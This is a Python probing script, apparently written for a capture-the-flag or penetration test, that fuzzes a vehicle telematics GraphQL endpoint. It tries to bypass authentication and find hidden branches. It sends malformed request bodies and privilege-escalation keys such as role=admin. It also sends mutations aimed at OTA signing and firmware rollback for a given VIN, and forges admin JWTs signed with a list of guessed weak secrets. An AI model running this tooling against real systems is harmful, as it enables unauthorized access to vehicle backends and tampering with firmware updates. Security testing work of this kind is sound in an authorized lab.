#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TSP /graphql 请求形状矩阵 v2（只读探测）。

目的：把「响应是否随请求形状变化」变成可判定命题。
基线：POST /graphql  body={}  -> 200 {"data":{"vehicles":[...]}}\\n  len=81
任何 (status, len, body) 偏离基线的行都单独打印并标 DEVIATION。

覆盖：
  A. body 语法/编码：batch 数组、嵌套 query 对象、operationName+variables、
     persisted-query(operations/map)、BOM、重复键、尾随垃圾、JSON 标量、
     application/graphql、form-urlencoded、multipart、text/plain
  B. 顶栏键触发：vin/vehicleVin/role/admin/debug/...
  C. query 关键词触发：ota/sign/campaign/vcu/flag/...
  D. 认证：HS256 JWT 多 secret、Basic、自定义 token 头
"""
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.parse
import urllib3

import requests

urllib3.disable_warnings()
BASE = "http://10.230.164.2:8080/graphql"
TIMEOUT = 5.0
VIN = "CV6FF52FEE9EDDD86"

CANONICAL = b'{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}\n'


def show(label, status, body, ctype="", extra=""):
    same = (status == 200 and body == CANONICAL)
    tag = "SAME" if same else "DEVIATION"
    txt = body.decode("utf-8", "replace")[:200].replace("\n", "\\n")
    print(f"  {label:58s} -> {status} len={len(body):6d} {tag}{extra} {txt!r}", flush=True)
    return same


def post_raw(label, data, headers=None, method="POST", url=BASE):
    h = {"Content-Type": "application/json"}
    if headers:
        h.update(headers)
    try:
        r = requests.request(method, url, data=data, headers=h,
                             timeout=TIMEOUT, allow_redirects=False)
        return show(label, r.status_code, r.content,
                    r.headers.get("Content-Type", ""))
    except Exception as e:
        print(f"  {label:58s} -> EXC {type(e).__name__}: {e}", flush=True)
        return None


def b64u(x):
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()


def jwt_hs256(secret, payload):
    head = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    body = b64u(json.dumps(payload).encode())
    sig = hmac.new(secret.encode(), f"{head}.{body}".encode(), hashlib.sha256).digest()
    return f"{head}.{body}.{b64u(sig)}"


def main():
    print("=" * 78)
    print(f"A. body / encoding matrix   target={BASE}  {time.strftime('%Y-%m-%dT%H:%M:%S%z')}")
    print("=" * 78)
    post_raw("baseline {}", b"{}")

    # --- A1 JSON 结构变体 ---
    cases = [
        ("batch array [{}]", b"[{}]"),
        ("batch array [{query}]", b'[{"query":"{vehicles{vin}}"}]'),
        ("batch array 2 items", b'[{"query":"a"},{"query":"b"}]'),
        ("nested query object", b'{"query":{"query":"{vehicles{vin}}"}}'),
        ("query+variables+operationName",
         json.dumps({"query": "query Q($vin:String){vehicles(vin:$vin){vin}}",
                     "variables": {"vin": VIN}, "operationName": "Q"}).encode()),
        ("persisted: operations+map",
         json.dumps({"operations": [{"query": "q"}], "map": {}}).encode()),
        ("extensions key", b'{"query":"x","extensions":{"persistedQuery":{"version":1,"sha256Hash":"aa"}}}'),
        ("BOM + {}", b"\xef\xbb\xbf{}"),
        ("BOM + json", b'\xef\xbb\xbf{"query":"x"}'),
        ("dup keys query twice", b'{"query":"a","query":"b"}'),
        ("dup keys vin", b'{"vin":"CV6000000DEMO0001","vin":"%s"}' % VIN.encode()),
        ("trailing garbage", b'{"query":"a"}GARBAGE'),
        ("trailing newline x3", b'{}\n\n\n'),
        ("trailing spaces", b'{}   '),
        ("leading whitespace", b'   \n\t{}'),
        ("scalar null", b"null"),
        ("scalar true", b"true"),
        ("scalar 0", b"0"),
        ("scalar string", b'"hello"'),
        ("empty array", b"[]"),
        ("empty object w/ spaces", b"{ }"),
        ("nul byte in body", b'{}\x00'),
    ]
    for label, data in cases:
        post_raw(label, data)

    # --- A2 Content-Type 变体（同一 body）---
    print("\n  -- Content-Type 变体 (body={}) --")
    for ct in ["application/json; charset=utf-8", "application/graphql",
               "application/graphql+json", "text/plain", "text/json",
               "application/x-www-form-urlencoded", "multipart/form-data",
               "", "*/*", "application/xml"]:
        h = {} if ct == "" else {"Content-Type": ct}
        try:
            r = requests.post(BASE, data=b"{}", headers=h, timeout=TIMEOUT,
                              allow_redirects=False)
            lbl = f"CT={ct!r}" if ct else "CT=<none>"
            show(lbl, r.status_code, r.content)
        except Exception as e:
            print(f"  CT={ct!r:40s} -> EXC {type(e).__name__}", flush=True)

    # --- A3 form / graphql 原生语法 ---
    print("\n  -- form / multipart / graphql 原生 --")
    try:
        r = requests.post(BASE, data={"query": "{vehicles{vin}}"}, timeout=TIMEOUT)
        show("form-urlencoded query=...", r.status_code, r.content)
    except Exception as e:
        print("  form EXC", e)
    try:
        r = requests.post(BASE, files={"file": ("a.txt", b"x")},
                          data={"query": "{vehicles{vin}}"}, timeout=TIMEOUT)
        show("multipart file+query", r.status_code, r.content)
    except Exception as e:
        print("  multipart EXC", e)
    try:
        r = requests.post(BASE, data=b"{vehicles{vin}}",
                          headers={"Content-Type": "application/graphql"},
                          timeout=TIMEOUT)
        show("application/graphql raw", r.status_code, r.content)
    except Exception as e:
        print("  graphql raw EXC", e)

    # --- B 顶栏键触发（可能被 struct 解析后用于分支）---
    print("\n" + "=" * 78)
    print("B. 顶层键触发矩阵（看是否有 DEVIATION）")
    print("=" * 78)
    topkeys = [
        ("vin", VIN), ("vehicleVin", VIN), ("vehicle_vin", VIN), ("VIN", VIN),
        ("role", "admin"), ("admin", True), ("isAdmin", True),
        ("debug", True), ("internal", True), ("token", "admin"),
        ("apiKey", "admin"), ("scope", "admin"), ("tenant", "internal"),
        ("mode", "prod"), ("env", "prod"), ("campaign", "c1"),
        ("campaignId", "c1"), ("rollback", 2), ("firmware", "vcu"),
        ("ecu", "VCU"), ("component", "VCU"), ("device", VIN),
    ]
    for k, v in topkeys:
        post_raw(f'top-key {k}={v!r}', json.dumps({k: v}).encode())

    # --- C query 关键词（查隐藏分支）---
    print("\n" + "=" * 78)
    print("C. query / operationName 关键词（隐藏分支探测）")
    print("=" * 78)
    kws = ["ota", "sign", "signature", "campaign", "vcu", "VCU", "firmware",
           "rollback", "admin", "debug", "internal", "flag", "secret",
           "healthz", "metrics", "pprof", "vehicles"]
    for k in kws:
        q = "{ %s }" % k
        post_raw(f'query={{ {k} }}', json.dumps({"query": q}).encode())
        post_raw(f'mutation {k}', json.dumps(
            {"query": f"mutation {{ {k}(vin:\"{VIN}\",rollback:2) {{ sig }} }}"}).encode())

    # --- D 认证 ---
    print("\n" + "=" * 78)
    print("D. 认证向量")
    print("=" * 78)
    secrets = ["secret", "cybercar", "tsp", "changeme", "jwt", "CV6", "ota",
               "password", "admin", "tsp-secret"]
    payloads = [
        {"sub": "admin", "role": "admin"},
        {"sub": "admin", "role": "admin", "vin": VIN, "scope": "ota:sign"},
    ]
    for sec in secrets:
        for i, pl in enumerate(payloads):
            tok = jwt_hs256(sec, pl)
            ok = post_raw(f"JWT HS256 secret={sec!r} p{i}",
                          b"{}", {"Authorization": "Bearer " + tok})
            if ok is False:
                break
    for h in ["X-Auth-Token", "X-Token", "X-TSP-Token", "X-Api-Key", "Api-Key",
              "X-API-KEY", "Token", "X-Access-Token"]:
        post_raw(f"header {h}: admin", b"{}", {h: "admin"})
    post_raw("Authorization: Basic dHNwOnRzcA==", b"{}",
             {"Authorization": "Basic dHNwOnRzcA=="})
    post_raw("Authorization: Bearer <vin>", b"{}",
             {"Authorization": "Bearer " + VIN})

    print("\n[done]", time.strftime("%Y-%m-%dT%H:%M:%S%z"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
